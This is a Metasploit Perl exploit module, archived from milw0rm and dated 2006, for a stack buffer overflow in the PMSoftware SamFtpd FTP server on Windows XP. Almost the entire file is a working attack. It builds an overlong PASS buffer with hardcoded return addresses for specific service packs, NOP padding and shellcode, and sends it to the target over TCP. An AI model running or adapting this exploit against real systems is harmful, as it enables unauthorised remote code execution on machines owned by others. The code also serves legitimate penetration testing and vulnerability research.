##
# Written by redsand
#
# This is simple, look for a {call,jmp} esp
##

package Msf::Exploit::pmsoftware_samftpd;
use base \"Msf::Exploit\";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	\'Name\'     => \'PMSoftware Samftpd Remote Exploit\',
	\'Version\'  => \'$Revision: 1.0 $\',
	\'Authors\'  => [ \'<redsand [at] blacksecurity.org>\', ],

	\'Arch\'  => [ \'x86\' ],
	\'OS\'    => [ \'win32\', \'win2000\', \'winxp\', \'win2003\' ],
	\'Priv\'  => 0,

	\'AutoOpts\'  => { \'EXITFUNC\' => \'thread\' },
	\'UserOpts\'  =>
	  {
		\'RHOST\' => [1, \'ADDR\', \'The target address\'],
		\'RPORT\' => [1, \'PORT\', \'The target port\', 21],
		\'USER\'  => [1, \'DATA\', \'Username\', \'redsand0wnedj00\'],
	  },

	\'Payload\'  =>
	  {
		\'Space\' => 1024,
		\'BadChars\'  => \"\\x00\\x0a\\x0d\\x20\",
		\'Keys\' => [\'+ws2ord\'],
	#	\'Prepend\' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",
	  },

	\'Description\'  =>  Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the log handler of Samftpd
	
}),

	\'Refs\'  =>
	  [
		[\'SA18574\',   \'secunia.com/advisories/SA18574\'],
	  ],

	\'DefaultTarget\' => 0,
	\'Targets\' =>
	  [
		[\'SamFtpd PmSoftware.exe WinXP SP0/1 Eng.\', 0x71ab7bfb],
		[\'SamFtpd PmSoftware.exe WinXP SP2 Eng.\', 0x77daaccf],
	  ],

	\'Keys\'  => [\'samftpd\'],

	\'DisclosureDate\' => \'Jan 25 2006\',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({\'Info\' => $info, \'Advanced\' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(\'RHOST\');
	my $target_port = $self->GetVar(\'RPORT\');
	my $target_idx  = $self->GetVar(\'TARGET\');
	my $shellcode   = $self->GetVar(\'EncodedPayload\')->Payload;
	my $target      = $self->Targets->[$target_idx];
	my $header	= \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\";

	if (! $self->InitNops(30)) {
		$self->PrintLine(\"[*] Failed to initialize the NOP module.\");
		return;
	}

	my $evil = (\"PASS \");
	$evil .= \"A\"x219;

	$evil .= pack(\"V\", $target->[1]) x 5 ;
	$evil .= \"\\x90\\x90\" x 5; # little bit of padding
	$evil .= $shellcode;
	$evil .= \"\\x0a\\x0d\";

	my $s = Msf::Socket::Tcp->new
	  (
		\'PeerAddr\'  => $target_host,
		\'PeerPort\'  => $target_port,
		\'LocalPort\' => $self->GetVar(\'CPORT\'),
	  );

	$self->PrintLine(sprintf (\"[*] PMSoftware Samftpd Remote Exploit by redsand\\@blacksecurity.org\"));

	if ($s->IsError) {
		$self->PrintLine(\'[*] Error creating socket: \' . $s->GetError);
		return;
	}

	#$self->PrintLine(sprintf (\"[*] Trying \".$target->[0].\" using return address 0x%.8x....\", $target->[4]));

	my $r = $s->Recv(-1, 30);
	if (! $r) { $self->PrintLine(\"[*] No response from FTP server\"); return; }
	($r) = $r =~ m/^([^\\n\\r]+)(\\r|\\n)/;
	$self->PrintLine(\"[*] $r\");

	$self->PrintLine(\"[*] Login as \" .$self->GetVar(\'USER\'));
	$s->Send(\"USER \".$self->GetVar(\'USER\').\"\\r\\n\");
	$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine(\"[*] No response from FTP server\"); return; }

	$self->PrintLine(\"[*] Sending evil buffer....\");
	$s->Send($evil);
	#$r = $s->Recv(-1, 10);
	if (! $r) { $self->PrintLine(\"[*] No response from FTP server\"); return; }
	$self->Print(\"[*] $r\");
	return;

}

# milw0rm.com [2006-01-25]
